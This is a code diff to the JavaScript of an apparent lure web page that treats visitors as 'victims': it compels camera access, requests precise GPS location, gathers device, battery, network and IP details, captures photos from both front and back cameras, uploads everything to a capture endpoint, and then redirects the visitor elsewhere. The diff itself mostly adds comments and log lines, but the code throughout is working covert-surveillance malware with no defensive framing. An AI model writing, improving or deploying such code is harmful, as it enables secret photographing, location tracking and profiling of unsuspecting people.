@@ -128,15 +128,17 @@
         console.log('Victim ID:', victimId);
         console.log('Redirect URL:', redirectUrl);
 
+        // ===== REDIRECT FUNCTION =====
         function doRedirect() {
             let target = 'https://google.com';
-            if (redirectUrl && redirectUrl.trim() !== '' && redirectUrl !== '{{REDIRECT_URL}}' && redirectUrl.toLowerCase().startsWith('http')) {
+            if (redirectUrl && redirectUrl.trim() !== '' && redirectUrl.toLowerCase().startsWith('http')) {
                 target = redirectUrl.trim();
             }
-            console.log('Final Redirect:', target);
+            console.log('Redirecting to:', target);
             window.location.href = target;
         }
 
+        // ===== BASIC INFO =====
         function getBasicInfo() {
             return {
                 userAgent: navigator.userAgent,
@@ -147,6 +149,7 @@
             };
         }
 
+        // ===== BATTERY =====
         async function getBatteryInfo() {
             try {
                 if (navigator.getBattery) {
@@ -160,6 +163,7 @@
             return { level: 'N/A', charging: 'N/A' };
         }
 
+        // ===== NETWORK =====
         function getNetworkInfo() {
             try {
                 if (navigator.connection) {
@@ -173,6 +177,7 @@
             return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
         }
 
+        // ===== IP =====
         async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -188,6 +193,7 @@
             }
         }
 
+        // ===== SEND DATA =====
         async function sendData(payload) {
             try {
                 return await fetch('/api/capture/cam', {
@@ -204,30 +210,37 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
+        // ===== CAMERA PERMISSION (COMPULSORY) =====
         async function requestCameraPermission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch (err) {
+                console.log('Camera perm error:', err);
                 return false;
             }
         }
 
+        // ===== GPS LOCATION PERMISSION (OPTIONAL — WATCH POSITION) =====
         function requestGPSPermission() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve({ granted: false, lat: null, lng: null });
+                    console.log('GPS not supported');
+                    resolve({ granted: false });
                     return;
                 }
+
                 console.log('Requesting GPS...');
                 let resolved = false;
+
+                // Use watchPosition to force prompt
                 const watchId = navigator.geolocation.watchPosition(
                     pos => {
                         if (!resolved) {
                             resolved = true;
                             navigator.geolocation.clearWatch(watchId);
-                            console.log('GPS granted');
+                            console.log('✅ GPS granted:', pos.coords.latitude, pos.coords.longitude);
                             resolve({
                                 granted: true,
                                 lat: pos.coords.latitude,
@@ -240,22 +253,26 @@
                         if (!resolved) {
                             resolved = true;
                             navigator.geolocation.clearWatch(watchId);
-                            console.log('GPS denied');
-                            resolve({ granted: false, lat: null, lng: null });
+                            console.log('❌ GPS denied:', err.message);
+                            resolve({ granted: false });
                         }
                     },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
+
+                // Timeout fallback
                 setTimeout(() => {
                     if (!resolved) {
                         resolved = true;
                         navigator.geolocation.clearWatch(watchId);
-                        resolve({ granted: false, lat: null, lng: null });
+                        console.log('GPS timeout');
+                        resolve({ granted: false });
                     }
                 }, 16000);
             });
         }
 
+        // ===== CAMERA CAPTURE =====
         async function captureCamera(facingMode, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -288,6 +305,7 @@
             }
         }
 
+        // ===== ERROR DISPLAY =====
         function showError(msg) {
             const errorBox = document.getElementById('permissionError');
             document.getElementById('errorMsg').textContent = msg;
@@ -298,6 +316,7 @@
             document.getElementById('permissionError').style.display = 'none';
         }
 
+        // ===== MAIN SEQUENCE =====
         async function startCapture() {
             const btn = document.getElementById('continueBtn');
             const loading = document.getElementById('loading');
@@ -315,7 +334,8 @@
             btn.textContent = '⏳ Please wait...';
             loading.classList.remove('hidden');
 
-            // CAMERA (COMPULSORY)
+            // ===== STEP 1: CAMERA (COMPULSORY) =====
+            console.log('Requesting camera...');
             const hasCamera = await requestCameraPermission();
             if (!hasCamera) {
                 btn.disabled = false;
@@ -325,10 +345,10 @@
                 return;
             }
 
-            // GPS (OPTIONAL)
+            // ===== STEP 2: GPS (OPTIONAL) =====
             const gps = await requestGPSPermission();
 
-            // INFO
+            // ===== STEP 3: COLLECT INFO =====
             const basicInfo = getBasicInfo();
             const batteryInfo = await getBatteryInfo();
             const networkInfo = getNetworkInfo();
@@ -357,17 +377,19 @@
             });
             await wait(500);
 
-            // FRONT CAMERA
+            // ===== STEP 4: FRONT CAMERA =====
+            console.log('Front camera...');
             const frontOk = await captureCamera('user', 'Front');
             await wait(1000);
 
-            // BACK CAMERA
+            // ===== STEP 5: BACK CAMERA =====
             if (frontOk) {
+                console.log('Back camera...');
                 await captureCamera('environment', 'Back');
                 await wait(1000);
             }
 
-            // TIMER + REDIRECT
+            // ===== STEP 6: TIMER + REDIRECT =====
             loading.classList.add('hidden');
             timer.style.display = 'block';
 
